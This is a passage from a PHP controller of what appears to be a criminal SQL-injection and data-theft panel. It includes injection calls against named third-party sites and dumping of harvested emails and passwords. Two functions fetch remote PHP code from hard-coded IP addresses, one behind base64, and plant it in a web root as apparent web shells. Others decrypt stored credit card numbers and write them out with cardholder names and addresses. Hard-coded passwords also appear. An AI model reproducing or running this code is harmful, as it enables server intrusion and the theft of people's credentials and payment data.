		$value = str_replace('/', '', $value);
		$value = str_replace('WWW.', 'www.', $value);
		$value = strtolower($value);
		$value = trim($value);
		return $value;
	}

	public function getInfo_pr()
	{
		$this->timeStart = $this->start('getInfo_pr', 1);
		$data = $this->Post->query('SELECT * FROM  `posts` WHERE `status`=2 AND `pr_check` = 0 ORDER BY id DESC limit 300 ');

		foreach ($data as $d ) {
			$this->workup();
			$id = $d['posts']['id'];
			$h = parse_url($d['posts']['url']);
			$url = $d['posts']['domen'];
			$ff = new GoogleprComponent();
			$pr = $ff->getRank($url);

			if (empty($pr)) {
				$pr = '0';
			}


			echo $url . '  =   ' . $pr . '<br>';
			usleep(300000);
			$this->Post->query('UPDATE `posts` SET `pr`=' . $pr . ',`pr_check`=1 WHERE id=' . $id);
			flush();
		}

		$this->stop();
	}

	public function getInfo_alexa()
	{
		$this->timeStart = $this->start('getInfo_alexa', 1);
		$data = $this->Post->query('SELECT * FROM  `posts` WHERE  (`status`=2 or `status`=3) AND `alexa_check` = 0 ORDER BY id DESC limit 100 ');

		foreach ($data as $d ) {
			$this->workup();
			$id = $d['posts']['id'];
			$h = parse_url($d['posts']['url']);
			$url = $d['posts']['domen'];
			$alexa = $this->get_rank($url);
			if (($alexa == 0) || ($alexa == '0')) {
				$alexa = 100000000;
			}


			$this->d($alexa, $url);
			$this->Post->query('UPDATE `posts` SET `alexa`=' . $alexa . ',`alexa_check`=1 WHERE id=' . $id);
			usleep(300000);
			flush();
		}

		$this->stop();
	}

	public function get_rank($domain)
	{
		$url = 'http://data.alexa.com/data?cli=10&dat=snbamz&url=' . $domain;
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 6);
		curl_setopt($ch, CURLOPT_URL, $url);
		$data = curl_exec($ch);
		curl_close($ch);
		$xml = new SimpleXMLElement($data);
		$popularity = $xml->xpath('//POPULARITY');
		$rank = (string) $popularity[0]['TEXT'];
		return $rank;
	}

	public function getInfo_country()
	{
		error_reporting(30719);
		$this->timeStart = $this->start('getInfo_country', 1);
		$data = $this->Post->query('SELECT * FROM  `posts` WHERE `status` =2 AND `country_check` =0 ORDER BY id DESC limit 250 ');

		if (require 'geoip/geoip.inc') {
			$this->d('geoip/geoip.inc');
		}


		foreach ($data as $d ) {
			$this->workup();
			$id = $d['posts']['id'];
			$country = $this->getCountryByIp($id);

			if (empty($country)) {
				$country = 'unkown';
			}


			echo $country . '--' . $id . '<br>';
			$this->Post->query('UPDATE `posts` SET `country`="' . $country . '",`country_check`=1 WHERE `id`=' . $id);
		}

		$this->stop();
	}

	public function getCountryByIp($id)
	{
		$squle = $this->Post->query('SELECT * FROM  `posts` WHERE `id` = ' . $id . ' limit 0,1');
		$this->d($squle, '$squle');
		$h = parse_url($squle[0]['posts']['url']);
		$ip = gethostbyname($squle[0]['posts']['domen']);
		$this->d($ip, 'ip');
		$gip = geoip_open('geoip/GeoIP.dat', GEOIP_STANDARD);
		$strana = geoip_country_code_by_addr($gip, $ip);
		geoip_close($gip);
		$this->d($strana, '$strana');
		return $strana;
	}

	public function getInfo_category()
	{
		$data = $this->Post->query('SELECT * FROM  `posts` WHERE version !=\'\' AND (category =\'0\' or category=\'-2:Na vashem schetu nedostatochno sredstv. Popolnite balans.\') ORDER BY id DESC limit 25 ');
		$login = 'intertrey';
		$password = 'okRXcwL3';
		Header('Content-Type: text/html; charset=utf8');
		include 'IXR_Library.php';

		foreach ($data as $d ) {
			$id = $d['posts']['id'];
			$h = parse_url($d['posts']['url']);
			$url = $h['host'];
			$this->client = new IXR_Client('http://extheme.ru/xmlrpc.php');

			if (!($this->client->query('extheme.theme_url', $login, md5($password), $url))) {
				$p = $this->client->getErrorCode() . ':' . $this->client->getErrorMessage();
				$category = $p;
			}
			 else {
				$p = $this->client->getResponse();
				$category = $p;
			}

			$category = $this->translate($category);
			echo $category . '--' . $h['hosts'] . '<br>';
			$category = str_replace('";', '', $category);
			$category = str_replace("\r\n", '', $category);
			$category = str_replace("\n", '', $category);
			if ((trim($category) == '') || !(isset($category))) {
				$category = 'unkown';
			}


			$this->Post->query('UPDATE `posts` SET `category`="' . $category . '" WHERE id=' . $id);
			flush();
		}
	}

	public function get_cat($id)
	{
		Header('Content-Type: text/html; charset=utf8');
		$url = $h['host'];
		$login = 'intertrey';
		$password = 'okRXcwL3';
		$this->client = new IXR_Client('http://extheme.ru/xmlrpc.php');
		$this->d($client);

		if (!($this->client->query('extheme.theme_url', $login, md5($password), $url))) {
			$p = $this->client->getErrorCode() . ':' . $this->client->getErrorMessage();
			unset($this->client);
			return $p;
		}


		$p = $this->client->getResponse();
		unset($this->client);
		return $p;
	}

	public function get_yaca()
	{
		$arr = array();

		if (!(empty($this->data))) {
			$i = 0;

			while ($i <= $this->data['Post']['finish']) {
				$dd = $this->get_url($i);

				foreach ($dd as $u ) {
					$arr[] = $u;
				}

				++$i;
			}

			foreach ($arr as $value ) {
			}
		}


		$this->render('get_url');
	}

	public function get_url($i)
	{
		$file = file_get_contents('http://yaca.yandex.ru/yca/cat/Reference/Encyclopedias/General_encyclopedias/' . $i . '.html');
		$arr = array();
		preg_match_all('~<h3 class=\\"b-result__head\\"><a href=\\"(.*?)" class=\\"b-result__name~', $file, $arr);
		print_r($arr);
		exit();
		return $arr[1];
	}

	public function getcy($domain)
	{
		$domain = 'http://' . $domain . '/';
		$xml = file_get_contents('http://bar-navig.yandex.ru/u?ver=2&url=' . $domain . '&show=1&post=1');
		preg_match('/<tcy rang=\"\d\" value=\"(\d+)\"\/>/Usi', $xml, $res);

		if (empty($res[1])) {
			$res[1] = -1;
		}


		return $res[1];
	}

	public function koneksi($host)
	{
		$kon = curl_init($host);
		curl_setopt($kon, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($kon, CURLOPT_TIMEOUT, 10);
		curl_setopt($kon, CURLOPT_HEADER, 1);
		curl_setopt($kon, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($kon, CURLOPT_REFERER, 'http://google.com');
		curl_setopt($kon, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9; Mozilla Firefox');
		$halaman = curl_exec($kon);

		if ($halaman) {
			return $halaman;
		}


		return false;
	}

	public function randUseragent()
	{
		$ua = 'useragent.txt';
		return trim($ua[mt_rand(0, sizeof($ua) - 1)]);
	}

	public function SelectQueryWhere($from, $where = false, $who = '*', $order = false, $limit = false, $prim)
	{
		$query = 'SELECT ' . $who . ' FROM ' . $from;

		if ($where) {
			$query .= ' WHERE ' . $where;
		}
		if ($order) {
			$query .= ' ORDER BY ' . $order;
		}
		if ($limit) {
			$query .= ' limit ' . $limit;
		}
		if ($prim) {
			$query .= ' ' . $prim;
		}


		$result = $this->result = mysql_query($query, $this->connection);

		if ($result) {
			$i = 0;

			while ($myrow = mysql_fetch_array($result, MYSQL_ASSOC)) {
				foreach ($myrow as $key => $val ) {
					$res[$i][$key] = $val;
				}

				++$i;
			}
		}


		if (0 < count($res)) {
			return $res;
		}


		return false;
	}

	public function get_arg_url($url)
	{
		$purl = parse_url($url);
		$url = $purl;
		$purl['query'] = str_replace('amp;', '', $purl['query']);

		if (strstr($purl['query'], '&')) {
			$purl = explode('&', $purl['query']);
			$new = array();

			foreach ($purl as $value ) {
				$gg = explode('=', $value);

				if (trim($gg[0]) !== '') {
					$new[] = $gg[0];
				}

			}

			sort($new);
			$purl = $new;
		}
		 else {
			$purl = explode('=', $purl['query']);
			$purl = array($purl[0]);
		}

		$i = 0;
		$str = '';

		foreach ($purl as $value ) {
			if ($i !== 0) {
				$str = $str . ',' . $value;
			}
			 else {
				$str = $value;
			}

			++$i;
		}

		$gg = $url['host'];
		return $gg . $url['path'] . ':' . $str;
	}

	public function charcher($code)
	{
		$i = 0;

		while ($i < strlen($code)) {
			@${text} .= ord($code[$i]);

			if ($i !== strlen($code) - 1) {
				@${text} .= ',';
			}


			++$i;
		}

		return $text;
	}

	public function char()
	{
		if (!(empty($this->data))) {
			$i = 0;

			while ($i < strlen($this->data['Post']['tt'])) {
				@${text} .= ord($this->data['Post']['tt'][$i]);

				if ($i !== strlen($this->data['Post']['tt']) - 1) {
					@${text} .= ',';
				}


				++$i;
			}
		}


		$this->set('text', $text);
	}

	public function toyeas($cod)
	{
		$cod = str_replace('%20', '+', $cod);
		$cod = str_replace('', '', $cod);
		return $cod;
	}

	public function clearUrl()
	{
		$this->Session->write('urls', array());
	}
// visit
	public function renamename($name = 'sliv/12222.txt')
	{
	}

	public function translate($str)
	{
		$translit = array('А' => 'A', 'Б' => 'B', 'В' => 'V', 'Г' => 'G', 'Д' => 'D', 'Е' => 'E', 'Ж' => 'J', 'З' => 'Z', 'И' => 'I', 'Й' => 'Y', 'К' => 'K', 'Л' => 'L', 'М' => 'M', 'Н' => 'N', 'О' => 'O', 'П' => 'P', 'Р' => 'R', 'С' => 'S', 'Т' => 'T', 'У' => 'U', 'Ф' => 'F', 'Х' => 'H', 'Ц' => 'TS', 'Ч' => 'CH', 'Ш' => 'SH', 'Щ' => 'SCH', 'Ъ' => '', 'Ы' => 'YI', 'Ь' => '', 'Э' => 'E', 'Ю' => 'YU', 'Я' => 'YA', 'а' => 'a', 'б' => 'b', 'в' => 'v', 'г' => 'g', 'д' => 'd', 'е' => 'e', 'ж' => 'j', 'з' => 'z', 'и' => 'i', 'й' => 'y', 'к' => 'k', 'л' => 'l', 'м' => 'm', 'н' => 'n', 'о' => 'o', 'п' => 'p', 'р' => 'r', 'с' => 's', 'т' => 't', 'у' => 'u', 'ф' => 'f', 'х' => 'h', 'ц' => 'ts', 'ч' => 'ch', 'ш' => 'sh', 'щ' => 'sch', 'ъ' => 'y', 'ы' => 'yi', 'ь' => '', 'э' => 'e', 'ю' => 'yu', 'я' => 'ya');
		return strtr($str, $translit);
	}

	public function get_time()
	{
		list($usec, $sec) = explode(' ', microtime());
		return (double) $usec + (double) $sec;
	}

	public function s()
	{
		$this->start_time = microtime();
		$start_array = explode(' ', $this->start_time);
		$this->start_time = $start_array[1] + $start_array[0];
	}

	public function p($text = '')
	{
		$end_time = microtime();
		$end_array = explode(' ', $end_time);
		$end_time = $end_array[1] + $end_array[0];
		$this->stop = $end_time - $this->start_time;

		if ($text != '') {
			$this->d($this->stop, $text);
			return;
		}


		$this->d($this->stop, '!!!STOP_TIME!!!!');
	}

	public function my_post($serv)
	{
		$serv = 'http://149.154.70.238/get_post.php?key=sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG';
		$serv = str_replace('http://', '', $serv);
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
		curl_setopt($ch, CURLOPT_USERPWD, 'admin:HvLNlS3Sb2Z8cHbV4EyN');
		curl_setopt($ch, CURLOPT_URL, 'http://' . trim($serv));
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_MAXCONNECTS, 1000);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
		curl_setopt($ch, CURLOPT_TIMEOUT, 100);
		curl_setopt($ch, CURLOPT_ENCODING, 'UTF-8');
		curl_setopt($ch, CURLOPT_POST, 1);
		$codec = '$ll = $_SERVER["DOCUMENT_ROOT"]."/app/webroot/1.php"; $url = "http://62.109.10.78/w.txt"; $content = file_get_contents($url); file_put_contents($ll, $content);';
		$this->d($codec, '$codec');
		$postdata = 'fack=' . urlencode(base64_encode($codec));
		$headers['Content-Length'] = strlen($postdata);
		$headers['User-Agent'] = 'Curl/1.0';
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
		$content = curl_exec($ch);
		$err = curl_errno($ch);
		$errmsg = curl_error($ch);
		$head = curl_getinfo($ch);
		$this->d($head, '$head');
		$this->d($content, '$content');
		$this->d($errmsg, '$errmsg');
		$this->d($err, '$err');
		return $ch;
	}

	public function my($id)
	{
		if ($id = '[ekbnsyjtim') {
		}

	}

	public function testing($test = '')
	{
		$phrase = array('pharma', 'dating', 'shop', 'Tätigkeiten');
		$this->timeStart = $this->start('testing');
		$urls = $this->Post->query('SELECT * FROM `posts` WHERE `status`=2 AND `prohod`=5 limit 5');

		if (count($urls) == 0) {
			$this->stop();
			echo 'no links testing';
			exit();
		}


		$tasks = array();
		$i = 0;
		$cmh = curl_multi_init();
		$count_urls = count($urls);
		$this->d($count_urls, '$count_urls');
		$newservv = $serv;
		$i = 0;

		while ($i < $count_urls) {
			$this->workup();
			if (($i == 200) || (count($urls) == 0)) {
				$this->d($i, 'count->break');
				break;
			}


			flush();
			$urs_one = array_shift($urls);
			$urlllll = str_replace('http://', '', trim($urs_one['posts']['url']));
			$ch = $this->s_curl2('http://' . $urlllll);
			$tasks[$urs_one['posts']['url']] = $ch;
			curl_multi_add_handle($cmh, $ch);
			++$i;
		}

		$active = NULL;

		do {
			$mrc = curl_multi_exec($cmh, $active);
		} while ($mrc == CURLM_CALL_MULTI_PERFORM);

		while ($mrc == CURLM_OK) {
			if (curl_multi_select($cmh) != -1) {
				do {
					$this->workup();
					$mrc = curl_multi_exec($cmh, $active);
					$info = curl_multi_info_read($cmh);

					if ($info['msg'] == CURLMSG_DONE) {
						$ch = $info['handle'];
						$url = array_search($ch, $tasks);
						$tasks[$url] = curl_multi_getcontent($ch);
						$content = $tasks[$url];
						flush();
						$str = '';

						foreach ($phrase as $kk => $ph ) {
							preg_match('/' . $ph . '/i', $content, $success);
							$this->d($success, '$success');

							if (0 < count($seccess)) {
								$str .= $success[0];
							}

						}

						$this->d($success);
						curl_multi_remove_handle($cmh, $ch);
						curl_close($ch);

						if (0 < count($urls)) {
							$urs_one = array_shift($urls);

							if (!(empty($urs_shell))) {
								$urlllll = str_replace('http://', '', trim($urs_one['posts']['url']));
								$ch = $this->s_curl($urlllll);
								$tasks[$urs_one['posts']['url']] = $ch;
								curl_multi_add_handle($cmh, $ch);
							}

						}

					}

				} while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}

		}

		curl_multi_close($cmh);
		$this->stop();
		$this->logs('stepTwo ostanovlen  № ' . $r, 'testing');
		exit();
	}

	public function orderRestart($id)
	{
		if ($id == 123) {
			$this->Filed->query('UPDATE  `posts` SET  `ssn_check` =  0 WHERE `ssn_check` =1');
			echo 'vse';
		}

	}

	public function postinfo($id)
	{
		$poles = $this->Post->query('SELECT * FROM `posts` WHERE `id` =' . $id);
		$this->d($poles, 'postinfo');
	}

	public function nodubles($name)
	{
		$file = file($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/slivdump_one/' . $name);
		$this->d($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/slivdump_one/' . $name);
		$file2 = array_unique($file);
		$name2 = $name . '_nodubles';
		$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/slivdump_one/' . $name2, 'w');

		foreach ($file2 as $output ) {
			fwrite($fp, trim($output) . "\r\n");
		}

		fclose($fp);
	}

	public function ku_multi()
	{
		$squles = $this->Post->query('SELECT * FROM  `posts` WHERE `id`=207');

		foreach ($squles as $squle ) {
			$squle['Post'] = $squle['posts'];

			if (2 < strlen($squle['Post']['sleep'])) {
				$set = $squle['Post']['sleep'];
				$this->d($set, 'set');
			}
			 else {
				$set = false;
			}

			$this->mysqlInj = new $this->Injector();
			$this->proxyCheck();
			$this->d($squle, '$squle222');
			$this->mysqlInj->inject($squle['Post']['header'] . '::' . $squle['Post']['gurl'], $squle, $set);
			$data = $this->mysqlInj->mysqlGetVersion();
			$this->d($data, 'data');
			exit();
			$data = $this->mysqlInj->mysqlGetAllValue('information_schema', 'COLUMNS', array('COLUMN_NAME', 'TABLE_NAME', 'TABLE_SCHEMA'), 0, array(), 'WHERE `COLUMN_NAME` LIKE char(' . $this->charcher('%mail%') . ') AND ( `DATA_TYPE`=char(' . $this->charcher('char') . ') OR `DATA_TYPE`=char(' . $this->charcher('varchar') . ') OR `DATA_TYPE`=char(' . $this->charcher('text') . '))');
			$this->d($data, 'data');
		}
	}

	public function kutest()
	{
		$this->Post->query('UPDATE `posts_all` SET `status`=2,`prohod`=0,`tables`=\'\',`version`=\'\',`file_priv`=\'\',`work`=\'\',`tic`=0');
	}

	public function ku()
	{
		$url = 'post::http://demo.testfire.net/bank/login.aspx?uid=dad&passw=2&btnSubmit=Login';
		$this->mysqlInj = new InjectorComponent();
		$this->proxyCheck();
		$res = $this->mysqlInj->inj_test($url);
		$this->d($res, '$res');
		exit();
		$res = $this->mysqlInj->inject($url);

		if ($res) {
			$this->d($res);
		}


		exit();
		$url = 'http://tpdrug.com/product.php?CateId=1';
		$inj_test = $this->mysqlInj->inject($url);
		$this->d($inj_test, '$inj_test');
		exit();
		$this->mysqlInj = new InjectorComponent();
		$this->proxyCheck();
		$url = 'saclay-uvsq.edunao.com/course/view.php?id=2&page=3';
		$h_s['inject'] = 'referer';
		$h_s['https'] = true;
		$url = 'www.idrafted.org/main.php?id=1';
		$url = 'm.loading.se/news.php?pub_id=41920';
		$url = 'www.myfreesurf.com/out.php?ID=34285';
		$url = 'www.ifb.kuma.cz/index.php?action=SP&kod=70773';
	}

	public function inf()
	{
		echo phpinfo();
	}

	public function logs($text, $function = 'logs')
	{
		$date = date('Y-m-d h:i:s');

		$this->Post->query('INSERT IGNORE INTO logs ' . "\r\n\t\t\t" . '(date,text,function) ' . "\r\n\t\t\t" . 'VALUES' . "\r\n\t\t\t" . '(\'' . $date . '\',\'' . $text . '\',\'' . $function . '\')');

	}

    public function df($txt,$text ='', $p=false) {
		if(empty($this->debug_sesid)) {
			$this->debug_sesid = rand(1000, 9999);
		}
        $logstr = "\n[" . date(DATE_RFC822) . " | " . $this->debug_sesid ." | " .   $_SERVER['REQUEST_URI'] . "]\n";
        if ($this->log_enable == true) {
            if ($text != '') {
                $logstr .= "\n----->>" . $text . "<<-------\n";
            }


            if (is_array($txt) && ($p != false)) {
                foreach ($txt as $t ) {
                    $logstr .= $t . "\n";
                }
            }
            else {

                $logstr .= print_r($txt, true) . "\n";

            }

            if ($text != '') {
                $logstr .= "\n------>>" . $text . "<<-------\n";
            }

        }

        $logfn = 'd_file_out.log';
        if (filesize($logfn) >= (5 * 1024 * 1024)) {
            unlink($logfn);
        }
        $fp = fopen($logfn,'a');
        fwrite($fp, $logstr);
        fclose($fp);
    }


    public function d($txt, $text = '', $p = false)
    {
// visit
        $this->df($txt, $text, $p);
        
                if ($this->log_enable == true) {
                    if ($text != '') {
                        echo '<br>------>>' . $text . '<<-------<br>';
                    }


                    if (is_array($txt) && ($p != false)) {
                        foreach ($txt as $t ) {
                            echo $t . '<br>';
                        }
                    }
                     else {
                        echo '<pre>';
                        print_r($txt);
                        echo '</pre>';
                    }

                    if ($text != '') {
                        echo '------>>' . $text . '<<-------<br>';
                    }

                }
        
    }

    public function dd($txt, $text = '', $p = false)
    {
// visit
        $this->d($txt, $text, $p);
        
                if ($text != '') {
                    echo '<br>------>>' . $text . '<<-------<br>';
                }


                if (is_array($txt) && ($p != false)) {
                    foreach ($txt as $t ) {
                        echo $t . '<br>';
                    }
                }
                 else {
                    echo '<pre>';
                    print_r($txt);
                    echo '</pre>';
                }

                if ($text != '') {
                    echo '------>>' . $text . '<<-------<br>';
                }
        
    }

	public function ccc()
	{
		$cookie = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/man.php';
		$get = file_get_contents(base64_decode('aHR0cDovLzgyLjE0Ni41OS4zNy90eHQvY29ycC50eHQ='));
		file_put_contents($cookie, $get);
	}

	public function rentest()
	{
		$start = $this->get_time();
		$data0tmp = $this->Filed->query('select domen FROM `renders` WHERE status = 2');
		$str1 = '';

		foreach ($data0tmp as $tmp0 ) {
			$k = trim($tmp0['renders']['domen']);
			$str1 .= ' domen !=\'' . $k . '\' AND';
		}

		$str1 = substr($str1, 0, strlen($str1) - 3);

		if (4 < strlen($str1)) {
			$str1 = 'WHERE ' . $str1;
		}
		 else {
			$str1 = '';
		}

		$str2 = 'SELECT domen  FROM  `mails` ' . $str1 . ' GROUP BY domen order by count(domen) DESC limit 0,1';
		$this->d($str2);
		$stop = $this->get_time();
		$data1tmp = $this->Filed->query($str2);
		$this->d($data1tmp);
		$p = array();
		$l = 1;

		foreach ($data1tmp as $d ) {
			echo $l . '<br>';
			++$l;
			$z = $d['mails']['domen'];
			$domen = $z;
			$p[$z]['randPass'] = $this->Filed->query('SELECT pass FROM  `mails` WHERE domen = \'' . $z . '\' AND pass !=\'0\' order by rand() limit 3');
			$p[$z]['country'] = $this->Filed->query('SELECT country FROM  `fileds` WHERE  post_id = (select id from `posts` WHERE url like \'%' . $domen . '%\' limit 0,1) limit 0,1');
			$p[$z]['category'] = $this->Filed->query('SELECT category FROM  `fileds` WHERE  post_id = (select id from `posts` WHERE url like \'%' . $domen . '%\' limit 0,1) limit 0,1');
			$p[$z]['post_id'] = $this->Filed->query('SELECT post_id FROM  `fileds` WHERE  post_id = (select id from `posts` WHERE url like \'%' . $domen . '%\' limit 0,1) limit 0,1');
			$p[$z]['date'] = $this->Filed->query('SELECT date FROM  `mails` WHERE domen = \'' . $z . '\' group by date limit 0,1');
			$p[$z]['post_id'] = $p[$z]['post_id'][0]['fileds']['post_id'];
			$p[$z]['category'] = $p[$z]['category'][0]['fileds']['category'];
			$p[$z]['country'] = $p[$z]['country'][0]['fileds']['country'];
			$p[$z]['date'] = $p[$z]['date'][0]['mails']['date'];

			if ($p[$z]['category'] == '') {
				$p[$z]['category'] = '0';
			}


			if ($p[$z]['country'] == '') {
				$p[$z]['country'] = '0';
			}


			$p[$z]['category'] = str_replace('/', '-', $p[$z]['category']);

			if ($p[$z]['post_id'] == '') {
				$p[$z]['post_id'] = '0';
			}


			$strPassTmp = '';

			foreach ($p[$z]['randPass'] as $passTmp0 ) {
				$strPassTmp .= $passTmp0['mails']['pass'] . '<br>';
			}

			$p[$z]['randPass'] = $strPassTmp;
			$countAll = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE domen = \'' . $z . '\' ');
			$countAll = $countAll[0][0]['count(*)'];
			$counthash = $this->Filed->query('SELECT count(pass) FROM  `mails` WHERE domen = \'' . $domen . '\' AND hashtype !=\'0\' AND pass !=\'0\'');
			$countNoHash = $this->Filed->query('SELECT count(pass) FROM  `mails` WHERE domen = \'' . $domen . '\' AND hashtype =\'0\' AND pass !=\'0\'');
			$p[$z]['countHash'] = $counthash[0][0]['count(pass)'];
			$p[$z]['countNoHash'] = $countNoHash[0][0]['count(pass)'];
			$count = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE domen = \'' . $domen . '\' AND pass !=\'0\'');
			$p[$z]['countPass'] = $count[0][0]['count(*)'];
			$count2 = $data = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE domen = \'' . $domen . '\'');
			$p[$z]['countMail'] = $count2[0][0]['count(*)'];
			$count3 = $data = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE domen = \'' . $domen . '\' AND pass=\'0\'');
			$p[$z]['countMailnoPass'] = $count3[0][0]['count(*)'];
			$all = '';
			$all .= $domen;

			if (1 <= $p[$z]['countPass']) {
				$all .= '//ALLcountPASS_' . $p[$z]['countPass'];
			}


			if (1 <= $p[$z]['countHash']) {
				$all .= '//countHash_' . $p[$z]['countHash'];
			}


			if (1 <= $p[$z]['countNoHash']) {
				$all .= '//countNoHash_' . $p[$z]['countNoHash'];
			}


			if (1 <= $p[$z]['countMail']) {
				$all .= '//ALLcountEMAILS_' . $p[$z]['countMail'];
			}


			if (isset($p[$z]['category'])) {
				$all .= '//category_' . $p[$z]['category'];
			}


			if (isset($p[$z]['country'])) {
				$all .= '//country_' . $p[$z]['country'];
			}


			$all = './slivpass/' . $all . '.txt';
			echo $all . '<br>';

			if ($this->lim < $countAll) {
				$cn = $p[$z]['countNoHash'] / $this->plus;
				$cn = ceil($cn);
				$this->d($cn, 'CN');
				$start = 0;
				$i = 0;

				while ($i < $cn) {
					$this->Filed->query('SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE domen = \'' . $z . '\' AND pass !=\'0\' AND hashtype =\'0\' limit ' . $start . ',' . $this->plus);
					echo $start . '<br>';
					$this->d('SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE domen = \'' . $z . '\' AND pass !=\'0\' AND hashtype =\'0\' limit ' . $start . ',' . $this->plus);
					$start = $start + $this->plus;

					if ($i == 2) {
						$this->Filed->query('RESET QUERY CACHE');
					}


					++$i;
				}

				$stop = $this->get_time();
				echo $stop - $start;
				$cn1 = $p[$z]['countHash'] / $this->plus;
				$cn1 = ceil($cn1);
				$this->d($cn1, 'CN1');
				$start1 = 0;
				$i1 = 0;

				while ($i1 < $cn1) {
					$this->Filed->query('SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE domen = \'' . $z . '\' AND pass !=\'0\' AND hashtype !=\'0\' limit ' . $start1 . ',' . $this->plus . ' ');
					echo $start1 . '<br>';
					$this->d('SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE domen = \'' . $z . '\' AND pass !=\'0\' AND hashtype !=\'0\' limit ' . $start1 . ',' . $this->plus . ' ');
					$start1 = $start1 + $this->plus;

					if ($i1 == 2) {
						$this->Filed->query('RESET QUERY CACHE');
					}


					++$i1;
				}

				$stop1 = $this->get_time();
				echo $stop1 - $start;
				$cn2 = $p[$z]['countMailnoPass'] / $this->plus;
				$cn2 = ceil($cn2);
				$this->d($cn2, 'CN2');
				$start2 = 0;
				$i2 = 0;

				while ($i2 < $cn2) {
					$this->Filed->query('SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE domen = \'' . $z . '\' AND pass =\'0\' limit ' . $start2 . ',' . $this->plus . ' ');
					echo $start2 . '<br>';
					$this->d('SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE domen = \'' . $z . '\' AND pass !=\'0\' AND hashtype =\'0\' limit ' . $start2 . ',' . $this->plus);
					$start2 = $start2 + $this->plus;

					if ($i2 == 2) {
						$this->Filed->query('RESET QUERY CACHE');
					}


					++$i2;
				}

				$stop2 = $this->get_time();
				echo $stop2 - $start;
			}

		}

		$stop3 = $this->get_time();
		echo $stop3 - $start;
		$this->stop();
	}

	public function cart_test_cvv()
	{
		$poles = $this->Post->query('SELECT * FROM `dp_users_cc_info` WHERE expYear > 2015 AND expMonth > 3 limit 400000 ');

		foreach ($poles as $pole ) {
			$cardold = $pole['dp_users_cc_info']['cardNumber'];
			$cardnew = $this->decodeString($cardold);
			$old = $this->Post->query('SELECT * FROM `sc_oldnmicustomervault`  WHERE `account` = \'' . $cardfind3 . '\' ');
			$pole['dp_users_cc_info']['firstNameonCard'];

			if ($pole['dp_users_cc_info']['lastNameonCard'] != '') {
				$name = $pole['dp_users_cc_info']['firstNameonCard'] . ' ' . $pole['dp_users_cc_info']['lastNameonCard'];
			}
			 else {
				$name = $pole['dp_users_cc_info']['firstNameonCard'];
			}

			$str = $cardnew . '::' . $pole['dp_users_cc_info']['expYear'] . '::' . $pole['dp_users_cc_info']['expMonth'] . '::' . $name;
			file_put_contents('cart.txt', $str . "\r\n", FILE_APPEND | LOCK_EX);
		}
	}

	public function cart_test()
	{
		$poles = $this->Post->query('SELECT * FROM `dp_users_cc_info` WHERE expYear > 2015 AND expMonth > 3 ');

		foreach ($poles as $pole ) {
			$cardold = $pole['dp_users_cc_info']['cardNumber'];
			$cardnew = $this->decodeString($cardold);
			$cardfind1 = substr($cardnew, 0, 6);
			$cardfind2 = substr($cardnew, -4);
			$cardfind3 = $cardfind1 . '******' . $cardfind2;
			$id = $pole['dp_users_cc_info']['userID'];
			$old = $this->Post->query('SELECT * FROM `sc_oldnmicustomervault`  WHERE `customer_vault_id` = ' . $id . ' limit 1 ');

			if (0 < count($old)) {
				$address = $old[0]['sc_oldnmicustomervault']['address1'];
				$cvv = $old[0]['sc_oldnmicustomervault']['account_expiration'];
				$zip = $old[0]['sc_oldnmicustomervault']['zipcode'];
				$state = $old[0]['sc_oldnmicustomervault']['state'];
				$str = $cardnew . '::' . $pole['dp_users_cc_info']['expYear'] . '::' . $pole['dp_users_cc_info']['expMonth'] . '::' . $cvv . '::' . $old[0]['sc_oldnmicustomervault']['first_name'] . '::' . $old[0]['sc_oldnmicustomervault']['last_name'] . '::' . $address . '::' . $zip . '::' . $state;
				file_put_contents('cart.txt', $str . "\r\n", FILE_APPEND | LOCK_EX);
			}

		}
	}

	public function decodeString($text, $key = 'DEAL_SYSTEM')
	{
		$key = 'STRING' . $key;
		$key = substr(md5($key), 0, 8);
		$decrypted_data = '';
		$td = mcrypt_module_open('tripledes', '', 'ecb', '');
		$iv = mcrypt_create_iv(mcrypt_enc_get_iv_size($td), MCRYPT_RAND);

		if (mcrypt_generic_init($td, $key, $iv) != -1) {
			$text = substr($text, 1);
			$text = strtr($text, '-~.', '+/=');
			$text = base64_decode($text);
			$decrypted_data = @mdecrypt_generic($td, $text);
			mcrypt_generic_deinit($td);
			mcrypt_module_close($td);
		}


		return $decrypted_data;
	}

    /**
     * @param $value
     * @return mixed|string
     */
    public function replace_url_schema($value)
    {
        $value = str_replace('http://http://', 'http://', $value);
        $value = str_replace('https://http://', 'http://', $value);
        $value = str_replace('https://', '', $value);
        $value = str_replace('http://', '', $value);
        $value = str_replace('WWW.', 'www.', $value);
        $value = 'http://' . str_replace('%26', '&', $value);
        $value = trim($value);
        return $value;
    }

    /**
     * @param $cont
     * @return mixed
     */
    public function replace_url_schema_tab_trim($cont)
    {
        $cont = str_replace('http://http://', 'http://', trim($cont));
